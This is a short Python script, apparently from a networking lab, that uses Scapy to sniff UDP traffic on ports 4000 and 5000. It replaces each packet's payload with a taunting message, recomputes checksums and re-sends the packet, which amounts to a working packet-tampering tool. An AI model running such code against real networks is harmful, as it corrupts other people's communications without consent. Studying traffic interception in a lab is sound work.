from scapy.all import Raw, AsyncSniffer, send, IP, UDP
from time import sleep

def handle_packet(packet):
    print("=== Packet Snooped ===", flush=True)
    #modify the packet's RAW contents 
    if(Raw in packet and packet[Raw].load != b"I don't like either >:)"):
        packet[Raw].load = b"I don't like either >:)"
        packet = packet[IP].copy()
        packet.show2()
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum

        send(packet)




sniffer = AsyncSniffer(
    iface="eth0",
    prn=handle_packet,
    store=False,
    filter="udp and (port 5000 or port 4000)"
)

sniffer.start()

# if KeyboardInterrupt:
#     print("Stopping sniffer...", flush=True)
#     sniffer.stop()

try:
    while True:
        print("Still sniffing...", flush=True)
        sleep(5)
except KeyboardInterrupt:
        print("Stopping sniffer...", flush=True)
        sniffer.stop()


